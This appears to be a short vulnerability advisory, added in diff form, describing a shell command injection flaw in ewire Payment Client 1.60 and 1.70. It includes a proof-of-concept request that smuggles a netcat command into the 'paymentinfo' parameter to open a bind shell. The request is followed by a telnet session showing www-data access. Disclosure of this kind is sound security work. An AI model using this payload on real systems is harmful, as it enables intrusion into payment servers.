@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/25683/info
+
+ewire Payment Client is prone to a vulnerability that allows attackers to execute arbitrary shell commands because the software fails to sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary shell commands on an affected computer with the privileges of the application using the affected class utility.
+
+ewire Payment Client 1.60 and 1.70 are vulnerable to this issue. 
+
+GET
+http://www.example.com/simplePHPLinux/3payment_receive.php?paymentin
+fo=`/bin/nc -l -p6666 -e /bin/bash`
+$ telnet www.example.com 6666
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
